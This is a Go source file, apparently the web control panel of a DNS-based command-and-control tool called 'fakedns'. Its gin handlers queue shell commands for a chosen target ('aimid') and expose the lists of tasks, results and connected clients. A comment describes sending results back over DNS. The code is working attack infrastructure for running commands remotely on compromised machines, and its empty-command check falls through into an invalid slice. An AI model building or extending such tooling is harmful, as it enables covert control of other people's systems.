package web

import (
	"fakedns/server"
	"github.com/gin-gonic/gin"
	"hash/crc32"
	"strconv"
	"time"
)

func Ping(c *gin.Context) {
	c.JSON(200, gin.H{
		"message": "pong",
	})
}

func Command(c *gin.Context) {
	cmd := c.Query("cmd")
	if len(cmd) < 1 {
		c.JSON(500, gin.H{
			"message": "cmd len error",
		})
	}
	//添加一条命令到队列
	//回传数据会有dns缓存问题 所以需要生成一个唯一的id  这里临时用cmd值crc32+当前时间代替
	id := strconv.FormatInt(int64(crc32.ChecksumIEEE([]byte(cmd[0:len(cmd)-1])))+time.Now().Unix(), 16)
	var task server.Task
	task.Id = id
	task.AimId = c.Query("aimid")
	task.Type = c.DefaultQuery("type", "1") //类型1 执行cmd/bash命令
	task.Finished = false
	task.Received = false
	task.Data = cmd
	server.Addtask(task)
	c.JSON(200, gin.H{
		"message": "ok",
	})
}

func GetTasks(c *gin.Context) {
	c.JSON(200, gin.H{
		"data":    server.TaskMap,
		"message": "ok",
	})
}
func GetResults(c *gin.Context) {
	c.JSON(200, gin.H{
		"data":    server.ResultMap,
		"message": "ok",
	})
}
func GetClients(c *gin.Context) {
	c.JSON(200, gin.H{
		"data":    server.ClientMap,
		"message": "ok",
	})
}
